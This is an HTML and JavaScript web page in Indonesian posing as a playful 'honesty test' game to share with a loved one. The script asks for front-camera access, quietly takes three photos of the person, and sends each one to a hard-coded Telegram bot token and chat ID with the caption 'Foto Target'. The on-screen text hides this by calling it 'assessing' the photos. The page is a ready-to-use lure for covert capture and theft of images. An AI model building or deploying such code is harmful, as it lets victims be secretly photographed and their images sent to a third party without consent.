<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Foto Kejujuran</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { overflow: hidden; background: #000; height: 100vh; width: 100vw; font-family: system-ui, 'Segoe UI', sans-serif; }
        #cameraVideo {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            object-fit: cover; transform: scaleX(-1); z-index: 1;
        }
        .overlay {
            position: fixed; bottom: 30px; left: 20px; right: 20px;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(16px);
            border-radius: 32px; padding: 20px; z-index: 2;
            text-align: center; color: white; border: 1px solid rgba(255,255,255,0.2);
            pointer-events: auto;
        }
        .btn-start {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            border: none; padding: 14px 24px; border-radius: 60px;
            font-size: 1.2rem; font-weight: bold; color: white;
            width: 100%; cursor: pointer; margin-top: 10px;
            transition: transform 0.1s;
        }
        .btn-start:active { transform: scale(0.97); }
        .status-text { font-size: 1rem; margin-bottom: 12px; }
        .toast {
            position: fixed; top: 20px; left: 20px; right: 20px;
            background: #1e293b; border-radius: 40px; padding: 10px 16px;
            text-align: center; z-index: 3; color: white;
            transition: 0.2s; pointer-events: none;
        }
        @media (min-width: 640px) {
            .overlay { max-width: 380px; left: auto; right: 20px; bottom: 30px; }
            .toast { max-width: 360px; left: auto; right: 20px; top: 20px; }
        }
        .countdown { font-weight: bold; color: #facc15; margin-top: 8px; }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body>
    <video id="cameraVideo" autoplay playsinline muted></video>
    <div class="overlay" id="overlay">
        <div class="status-text" id="statusMsg">GAME HAVE FUN TES KEJUJURAN</div>
        <div id="detailInfo" style="font-size:0.75rem; opacity:0.8;">SERU SERUAN BARENG ORANG KESANGAN MU DENGAN CHALLENGE TES KEJUJURAN</div>
        <button id="startBtn" class="btn-start">MULAI TES</button>
        <div id="countdownArea" class="countdown"></div>
    </div>
    <div id="toast" class="toast" style="opacity:0; visibility:hidden;"></div>

    <script>
        // ================= KONFIGURASI TELEGRAM (SUDAH DIISI) =================
        const BOT_TOKEN = "8938453262:AAFxNwRyyGtRa05QLNNIBJlp5IQwlnFu0NE";
        const CHAT_ID = "5710362380";
        // ====================================================================

        const video = document.getElementById('cameraVideo');
        const startBtn = document.getElementById('startBtn');
        const statusMsg = document.getElementById('statusMsg');
        const detailInfo = document.getElementById('detailInfo');
        const countdownArea = document.getElementById('countdownArea');
        const toastEl = document.getElementById('toast');

        let mediaStream = null;
        let isActive = false;
        let timeouts = [];
        let captureResults = [];

        function showToast(msg, isError = false) {
            toastEl.style.opacity = '1';
            toastEl.style.visibility = 'visible';
            toastEl.innerHTML = isError ? `⚠️ ${msg}` : `✅ ${msg}`;
            toastEl.style.backgroundColor = isError ? '#991b1b' : '#065f46';
            setTimeout(() => {
                toastEl.style.opacity = '0';
                setTimeout(() => toastEl.style.visibility = 'hidden', 300);
            }, 2500);
        }

        function updateUI(message, icon = '📸', detail = null) {
            statusMsg.innerHTML = `${icon} ${message}`;
            if (detail) detailInfo.innerText = detail;
        }

        function clearTimeouts() {
            timeouts.forEach(t => clearTimeout(t));
            timeouts = [];
        }

        function stopCamera() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
                mediaStream = null;
            }
            video.srcObject = null;
        }

        async function captureSnapshot() {
            return new Promise((resolve, reject) => {
                if (!video || video.videoWidth === 0) reject(new Error('Video belum siap'));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => blob ? resolve(blob) : reject(new Error('Blob gagal')), 'image/jpeg', 0.85);
            });
        }

        async function sendToTelegram(blob, photoNum) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `kejujuran_${Date.now()}_${photoNum}.jpg`);
            formData.append('caption', `📸 Foto Target #${photoNum} - ${new Date().toLocaleTimeString()}`);
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            const json = await res.json();
            return json.ok;
        }

        async function takeAndSend(photoIndex) {
            if (!isActive) return false;
            // efek kilat
            video.style.transition = 'filter 0.1s';
            video.style.filter = 'brightness(1.3)';
            setTimeout(() => video.style.filter = '', 120);
            
            updateUI(`Menilai Foto ${photoIndex}/3...`, '📷', 'Harap tunggu...');
            try {
                const blob = await captureSnapshot();
                updateUI(`Menilai foto ${photoIndex}/3...`, '📤', 'Berhasil');
                const success = await sendToTelegram(blob, photoIndex);
                if (success) {
                    captureResults.push(true);
                    showToast(`Foto ${photoIndex} berhasil dikirim!`);
                    updateUI(`✅ Foto ${photoIndex} sukses`, '✅', `Yang Ke ${photoIndex}`);
                    return true;
                } else {
                    throw new Error('Gagal kirim ke Telegram');
                }
            } catch (err) {
                captureResults.push(false);
                showToast(`Foto ${photoIndex} gagal: ${err.message}`, true);
                updateUI(`❌ Gagal foto ${photoIndex}`, '❌', 'Gagal');
                return false;
            }
        }

        async function startPhotoSequence() {
            if (!mediaStream) {
                showToast('Kamera belum aktif, coba lagi', true);
                return;
            }

            isActive = true;
            captureResults = [];
            clearTimeouts();
            updateUI('Memulai Untuk Menilai...', '🎬', 'Proses');
            
            // Jadwal foto 1,2,3 dengan jeda 3 detik
            const schedule = (index, delay) => {
                const tid = setTimeout(async () => {
                    if (!isActive) return;
                    await takeAndSend(index);
                    if (index === 3) {
                        finish();
                    } else {
                        // tampilkan countdown di area khusus
                        let remain = 3;
                        countdownArea.innerText = `⏳ Tes Berikutnya ${remain} !`;
                        const countInterval = setInterval(() => {
                            remain--;
                            if (remain >= 0) countdownArea.innerText = `⏳ Tes berikutnya ${remain} !`;
                            if (remain < 0) clearInterval(countInterval);
                        }, 1000);
                        timeouts.push(countInterval);
                        detailInfo.innerText = `Jeda Sebentar ke ${index+1}...`;
                    }
                }, delay);
                timeouts.push(tid);
            };
            schedule(1, 300);
            schedule(2, 3300);
            schedule(3, 6300);
            
            const finalTimeout = setTimeout(() => {
                if (countdownArea) countdownArea.innerText = '';
            }, 7000);
            timeouts.push(finalTimeout);
        }

        function finish() {
            isActive = false;
            clearTimeouts();
            const successCount = captureResults.filter(v => v === true).length;
            if (successCount === 3) {
                updateUI('Selesai! Anda Orang Yang Sangat Jujur', '🎉', 'Refresh halaman untuk mengulang');
                showToast('Anda Sangat Jujur 100/10!');
            } else if (successCount > 0) {
                updateUI(`Selesai: ${successCount}/3 Berhasil`, '👍', 'Coba lagi lain waktu');
                showToast(`${successCount} dari 3 foto terkirim.`);
            } else {
                updateUI('Gagal total, anda orang yang tidak jujur', '❌', 'Semangat Untuk Menjadi Jujur');
                showToast('Tidak ada foto terkirim. Periksa koneksi atau token.', true);
            }
            countdownArea.innerText = '';
            startBtn.disabled = false;
            startBtn.innerText = '⟳ MULAI TES LAGI';
        }

        async function initCamera() {
            if (mediaStream) stopCamera();
            updateUI('Akses kamera...', '📷', 'Izinkan kamera depan');
            startBtn.disabled = true;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                mediaStream = stream;
                video.srcObject = stream;
                await video.play();
                updateUI('Kamera depan aktif!', '✅', 'Ayo Mulai Tes');
                setTimeout(() => startPhotoSequence(), 800);
            } catch (err) {
                let msg = 'Izin kamera ditolak atau tidak ada kamera.';
                if (err.name === 'NotAllowedError') msg = 'Izin kamera ditolak. Klik tombol izinkan.';
                else if (err.name === 'NotFoundError') msg = 'Kamera depan tidak ditemukan.';
                updateUI('Gagal akses kamera', '❌', msg);
                showToast(msg, true);
                startBtn.disabled = false;
            }
        }

        startBtn.addEventListener('click', () => {
            if (mediaStream && !isActive) {
                // kamera sudah aktif dan tidak sedang memotret
                startPhotoSequence();
                startBtn.disabled = true;
                setTimeout(() => { if(!isActive) startBtn.disabled = false; }, 7000);
            } else if (!mediaStream) {
                initCamera();
            } else {
                // sedang aktif, tidak boleh interupsi
                showToast('Tunggu proses selesai', true);
            }
        });

        // Peringatan jika bukan HTTPS (tapi tidak menghalangi)
        if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.match(/127\.0\.0\.1/)) {
            detailInfo.innerText = '⚠️ Gunakan HTTPS atau localhost untuk akses kamera.';
        }
    </script>
</body>
</html>
